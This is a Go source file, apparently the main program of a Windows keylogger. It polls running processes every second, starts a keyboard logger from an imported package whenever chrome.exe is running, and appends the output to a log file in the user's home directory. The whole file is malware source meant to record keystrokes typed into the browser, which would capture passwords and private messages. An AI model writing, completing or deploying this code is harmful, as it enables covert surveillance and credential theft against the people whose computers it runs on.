package main

import (
	"fmt"
	"keylogger/pkg/keyboardlogger"
	"keylogger/pkg/winprocessutils"
	"log"
	"os"
	"time"
)

func main() {
	loggerRunning := false
	var logsDirectory string = ""
	if len(os.Args) > 1 {
		logsDirectory = os.Args[1]
	} else {
		home, err := os.UserHomeDir()
		if err != nil {
			log.Fatal(err)
		}
		logsDirectory = fmt.Sprintf("%s/logs.txt", home)
	}
	var file *os.File
	var err error
	file, err = os.OpenFile(logsDirectory, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		var openErr error
		_, createErr := os.Create(logsDirectory)
		file, openErr = os.OpenFile(logsDirectory, os.O_APPEND|os.O_WRONLY, 0644)
		if openErr != nil {
			log.Fatal(createErr)
		}
	}
	defer file.Close()

	fmt.Println(logsDirectory)

	for {
		procs, err := winprocessutils.Processes()
		if err != nil {
			log.Fatal(err)
		}
		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
		fmt.Println(chrome)
		if chrome != nil {
			fmt.Println(loggerRunning)
			if !loggerRunning {
				go keyboardlogger.StartKeyboardLogger(logsDirectory, file, &loggerRunning)
			}
		} else {
			if loggerRunning {
				go keyboardlogger.StopKeyboardLogger(&loggerRunning)
			}
		}
		time.Sleep(1 * time.Second)
	}

}
